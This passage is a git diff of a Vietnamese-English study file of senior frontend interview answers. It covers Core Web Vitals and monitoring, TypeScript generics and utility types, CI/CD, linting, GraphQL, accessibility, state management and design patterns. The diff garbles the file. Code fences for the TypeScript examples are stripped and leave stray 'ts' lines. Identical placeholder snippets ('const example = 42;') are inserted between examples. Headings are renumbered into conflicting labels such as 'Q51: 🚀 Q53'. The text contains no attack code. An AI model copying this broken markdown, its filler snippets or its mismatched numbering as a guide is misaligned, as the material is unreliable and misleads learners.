-**"Performance monitoring tracks Core Web Vitals (LCP, INP, CLS) + custom metrics. Tools: Sentry (errors), DataDog/New Relic (RUM), Lighthouse CI (lab tests). Set budgets (JS < 200KB), alerts (LCP > 2.5s), optimize iteratively."**
-
-**🔑 Core Web Vitals (Google Ranking Factors):**
-
-**1. LCP (Largest Contentful Paint) - Tốc độ tải:**
-- **Métric**: Thời gian phần tử lớn nhất hiển thị
-- **Target**: ≤ 2.5s (good), 2.5-4s (needs improvement), > 4s (poor)
-- **Optimize**: Preload images, CDN, optimize images (WebP), server response time
-
-**2. INP (Interaction to Next Paint) - Responsiveness:**
-- **Métric**: Thời gian từ click/tap đến update UI
-- **Target**: ≤ 200ms (good), 200-500ms (needs improvement), > 500ms (poor)
-- **Optimize**: Debounce events, code splitting, avoid long tasks (>50ms)
-
-**3. CLS (Cumulative Layout Shift) - Visual stability:**
-- **Métric**: Layout shifts bất ngờ (images, ads load)
-- **Target**: ≤ 0.1 (good), 0.1-0.25 (needs improvement), > 0.25 (poor)
-- **Optimize**: Set width/height cho images, reserve space cho ads
-
-**🔑 APM Tools:**
-
-**1. Sentry - Error Tracking:**
-- **Captures**: JS errors, unhandled rejections, network errors
-- **Context**: User info, breadcrumbs (user actions), device/browser
-- **Source maps**: Show original code in production errors
-- **Alerts**: Slack/email khi error spike
-
-**2. DataDog/New Relic - RUM (Real User Monitoring):**
-- **Tracks**: Core Web Vitals, custom metrics, user sessions
-- **Distributed tracing**: Frontend request → API → Database (full stack)
-- **Dashboards**: Real-time metrics, historical trends
-- **Synthetic monitoring**: Simulated user journeys (check uptime)
-
-**3. Lighthouse CI:**
-- **Lab tests**: Automated performance audits on PR
-- **Budgets**: Fail build nếu JS > 200KB, LCP > 3s
-- **Trends**: Track performance regression over time
-
-**⚠️ Lỗi Thường Gặp:**
-- Ship source maps public → expose code, dùng `hidden-source-map`
-- Không sample events → high APM costs, sample 10-20% traffic
-- Ignore CLS → SEO penalty, poor UX
-- Không set performance budgets → gradual degradation
-
-**💡 Kiến Thức Senior:**
-- **TTFB (Time to First Byte)**: Server response time, optimize với CDN/edge
-- **FID → INP**: Google replaced FID (First Input Delay) với INP (2024)
-- **Custom metrics**: `performance.mark()`, `performance.measure()` cho business logic
-- **Session replay**: FullStory, LogRocket - replay user sessions cho debugging
-- **Alerting**: Set thresholds (LCP p75 > 3s) → PagerDuty/Slack alerts
-
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)  
-> **Thời gian trả lời:** 15-20 phút
-
----
----
-## 53. 🔷 Q52: TypeScript Advanced Patterns - Generics, Utility Types, Advanced Patterns  
-
-**P1: Tên câu hỏi:** 🔷 Q52: TypeScript Advanced Patterns - Generics, Utility Types, Advanced Patterns  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"TypeScript advanced = Generics, Utility Types, Mapped Types, Conditional Types, Type Guards.**
-
-**🔧 Core Advanced Concepts:**
-
-1. **Generics**:
-   - **Purpose**: Type-safe reusable functions/components.
-   - **Constraints**: `<T extends Type>` → limit T to specific types.
-   ```ts
+ts
    function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
      return obj[key]; // Chú giải: Type-safe property access
    }
    const user = { name: 'Alice', age: 30 };
    getProperty(user, 'name'); // Chú giải: Type: string
-   ```
 
-2. **Utility Types** (Built-in):
-   - **`Partial<T>`**: Tất cả properties optional.
-   - **`Required<T>`**: Tất cả properties required.
-   - **`Pick<T, K>`**: Lấy subset properties.
-   - **`Omit<T, K>`**: Loại bỏ properties.
-   - **`Record<K, V>`**: Object với keys K, values V.
-   - **`Readonly<T>`**: Immutable properties.
-   ```ts
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    type User = { id: number; name: string; email: string };
    type PartialUser = Partial<User>; // Chú giải: All optional
    type UserName = Pick<User, 'id' | 'name'>; // Chú giải: Only id, name
    type NoEmail = Omit<User, 'email'>; // Chú giải: Exclude email
-   ```
 
-3. **Mapped Types**:
-   - Transform existing types.
-   ```ts
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    type Readonly<T> = { readonly [K in keyof T]: T[K] };
    type Optional<T> = { [K in keyof T]?: T[K] };
-   ```
 
-4. **Conditional Types**:
-   - `T extends U ? X : Y` → type-level if-else.
-   ```ts
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    type IsString<T> = T extends string ? true : false;
    type A = IsString<string>; // Chú giải: true
    type B = IsString<number>; // Chú giải: false
-   ```
 
-5. **Template Literal Types** (TS 4.1+):
-   - String manipulation at type level.
-   ```ts
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    type EventName<T extends string> = `on${Capitalize<T>}`;
    type ClickEvent = EventName<'click'>; // Chú giải: "onClick"
-   ```
 
-6. **Type Guards**:
-   - Runtime type checking → narrow types.
-   ```ts
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    function isString(value: unknown): value is string {
      return typeof value === 'string';
    }
    if (isString(value)) {
      value.toUpperCase(); // Chú giải: TS knows value is string
    }
-   ```
 
-7. **Discriminated Unions**:
-   - Type-safe state machines.
-   ```ts
-   type State = 
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
+   type State =
      | { status: 'loading' }
      | { status: 'success'; data: string }
      | { status: 'error'; error: Error };
-   
+
    function handle(state: State) {
      switch (state.status) {
        case 'loading': return 'Loading...';
@@ -31041,54 +19597,61 @@ const measure = performance.getEntriesByName('checkout')[0];
        case 'error': return state.error.message;
      }
    }
-   ```
 
-**🎯 Real-World Use Cases:**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-1. **API Response Typing**:
-   ```ts
-   type ApiResponse<T> = 
+ts
+   type ApiResponse<T> =
      | { success: true; data: T }
      | { success: false; error: string };
-   
+
    async function fetchUser(): Promise<ApiResponse<User>> {
  // Chú giải: ...
    }
-   ```
 
-2. **Form State**:
-   ```ts
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    type FormState<T> = {
      values: T;
      errors: Partial<Record<keyof T, string>>;
      touched: Partial<Record<keyof T, boolean>>;
    };
-   ```
 
-3. **Branded Types** (Nominal Typing):
-   - Prevent mixing similar types.
-   ```ts
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
    type UserId = string & { __brand: 'UserId' };
    type ProductId = string & { __brand: 'ProductId' };
-   
+
    function getUser(id: UserId) { /*...*/ }
    const userId = '123' as UserId;
    getUser(userId); // Chú giải: OK
  // Chú giải: getUser('456'); // Error: string not assignable to UserId
-   ```
 
-**⚠️ Common Mistakes:**
-- **any overuse**: Defeat purpose of TypeScript → dùng `unknown` + type guards.
-- **Type assertions abuse**: `as` bypass type checking → dùng type guards instead.
-- **Missing generic constraints**: `<T>` too broad → dùng `<T extends Type>`.
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**💡 Senior Insights:**
-- **infer keyword**: Extract types from other types.
-  ```ts
+ts
   type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
-  ```
-- **Const assertions**: `as const` → literal types instead of widening.
-  ```ts
+
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+ts
   const colors = ['red', 'blue'] as const; // Chú giải: Type: readonly ["red", "blue"]
   ```
 - **tsconfig strict mode**: Enable all strict checks (`strict: true`) → catch bugs early.
@@ -31096,19 +19659,20 @@ const measure = performance.getEntriesByName('checkout')[0];
 
 ---
 
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)  
+> **Câu hỏi phỏng vấn Senior Frontend Developer**
+> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)
 > **Thời gian trả lời:** 15-20 phút
 
 ---
 ---
-## 54. 🚀 Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation  
 
-**P1: Tên câu hỏi:** 🚀 Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation  
+## 51. Q51: 🚀 Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🚀 Q53: CI/CD Pipeline - GitHub Actions, Deployment Automation
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 52. Q52: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -31161,19 +19725,20 @@ const measure = performance.getEntriesByName('checkout')[0];
 - **Deployment slots** (Azure): Test production environment trước swap
 - **Feature flags**: Deploy code OFF, bật dần (LaunchDarkly)
 
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)  
+> **Câu hỏi phỏng vấn Senior Frontend Developer**
+> **Độ khó:** ⭐⭐⭐⭐⭐ (Expert Level)
 > **Thời gian trả lời:** 15-20 phút
 
 ---
 ---
-## 55. 📏 Q54: Code Quality & Standards - ESLint, Prettier, Code Review  
 
-**P1: Tên câu hỏi:** 📏 Q54: Code Quality & Standards - ESLint, Prettier, Code Review  
+## 53. Q53: 📏 Q54: Code Quality & Standards - ESLint, Prettier, Code Review
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 📏 Q54: Code Quality & Standards - ESLint, Prettier, Code Review
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 54. Q54: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -31224,19 +19789,20 @@ const measure = performance.getEntriesByName('checkout')[0];
 - **Lighthouse CI**: Performance budgets trong CI/CD
 - **Danger.js**: Automate code review comments (big PRs warning, missing tests)
 
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐ (Advanced)  
+> **Câu hỏi phỏng vấn Senior Frontend Developer**
+> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
 > **Thời gian trả lời:** 12-15 phút
 
 ---
 ---
-## 56. 🔄 Q55: GraphQL vs REST - API Design, Apollo Client  
 
-**P1: Tên câu hỏi:** 🔄 Q55: GraphQL vs REST - API Design, Apollo Client  
+## 55. Q55: 🔄 Q55: GraphQL vs REST - API Design, Apollo Client
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🔄 Q55: GraphQL vs REST - API Design, Apollo Client
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 56. Q56: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -31285,19 +19851,20 @@ const measure = performance.getEntriesByName('checkout')[0];
 - **Federation**: Microservices architecture cho GraphQL
 - **Batching**: Combine multiple queries in 1 HTTP request
 
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐ (Advanced)  
+> **Câu hỏi phỏng vấn Senior Frontend Developer**
+> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
 > **Thời gian trả lời:** 12-15 phút
 
 ---
 ---
-## 57. ♿ Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers  
 
-**P1: Tên câu hỏi:** ♿ Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers  
+## 57. Q57: ♿ Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: ♿ Q56: Web Accessibility (a11y) - WCAG 2.1, ARIA, Screen Readers
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 58. Q58: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -31349,19 +19916,20 @@ const measure = performance.getEntriesByName('checkout')[0];
 - **Automated testing**: axe-core, jest-axe, Lighthouse CI
 - **Manual testing**: Tab navigation, zoom 200%, screen reader walkthrough
 
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐ (Advanced)  
+> **Câu hỏi phỏng vấn Senior Frontend Developer**
+> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
 > **Thời gian trả lời:** 12-15 phút
 
 ---
 ---
-## 58. 🗂️ Q57: State Management Comparison - Redux vs Zustand vs Jotai  
 
-**P1: Tên câu hỏi:** 🗂️ Q57: State Management Comparison - Redux vs Zustand vs Jotai  
+## 59. Q59: 🗂️ Q57: State Management Comparison - Redux vs Zustand vs Jotai
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🗂️ Q57: State Management Comparison - Redux vs Zustand vs Jotai
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 60. Q60: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -31411,19 +19979,20 @@ const measure = performance.getEntriesByName('checkout')[0];
 - **Jotai atoms**: Làm việc với React.lazy, Suspense boundaries
 - **Zustand middleware**: persist (localStorage), immer (immutable updates), devtools
 
-> **Câu hỏi phỏng vấn Senior Frontend Developer**  
-> **Độ khó:** ⭐⭐⭐⭐ (Advanced)  
+> **Câu hỏi phỏng vấn Senior Frontend Developer**
+> **Độ khó:** ⭐⭐⭐⭐ (Advanced)
 > **Thời gian trả lời:** 12-15 phút
 
 ---
 ---
-## 59. 🌐 Q58: Networking & Browser Internals - Mạng & Nội Tế Trình Duyệt  
 
-**P1: Tên câu hỏi:** 🌐 Q58: Networking & Browser Internals - Mạng & Nội Tế Trình Duyệt  
+## 61. Q61: 🌐 Q58: Networking & Browser Internals - Mạng & Nội Tế Trình Duyệt
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🌐 Q58: Networking & Browser Internals - Mạng & Nội Tế Trình Duyệt
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 62. Q62: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
 
@@ -31473,16 +20042,17 @@ const measure = performance.getEntriesByName('checkout')[0];
 - **Service Workers**: Network proxy, offline caching, cache strategies
 
 > **Câu hỏi phỏng vấn Senior Frontend Developer**
-> **Độ khó:** ⭐⭐⭐⭐⭐ (Advanced)  
+> **Độ khó:** ⭐⭐⭐⭐⭐ (Advanced)
 > **Thời gian trả lời:** 15-25 phút---
 ---
-## 60. 🎨 Q59: CSS Architecture & Modern Styling Approaches  
 
-**P1: Tên câu hỏi:** 🎨 Q59: CSS Architecture & Modern Styling Approaches  
+## 63. Q63: 🎨 Q59: CSS Architecture & Modern Styling Approaches
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🎨 Q59: CSS Architecture & Modern Styling Approaches
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 64. Q64: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
 
@@ -31539,13 +20109,14 @@ So sánh các phương pháp styling hiện đại: CSS-in-JS (Styled Components
 
 ---
 ---
-## 61. 🏗️ Q60: JavaScript Design Patterns for Frontend Development  
 
-**P1: Tên câu hỏi:** 🏗️ Q60: JavaScript Design Patterns for Frontend Development  
+## 65. Q65: 🏗️ Q60: JavaScript Design Patterns for Frontend Development
 
-**P2: Trả lời (Senior):**
+### P1: Tên câu hỏi: 🏗️ Q60: JavaScript Design Patterns for Frontend Development
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+### P2: Trả lời (Senior):
+
+## 66. Q66: **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
 
 ### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
 
@@ -31607,4 +20178,3 @@ So sánh các phương pháp styling hiện đại: CSS-in-JS (Styled Components
 Giải thích các Design Patterns phổ biến trong JavaScript/TypeScript frontend: Singleton, Observer, Factory, Module, Pub/Sub, Prototype, Dependency Injection. Khi nào nên dùng pattern nào?
 
 ---
-
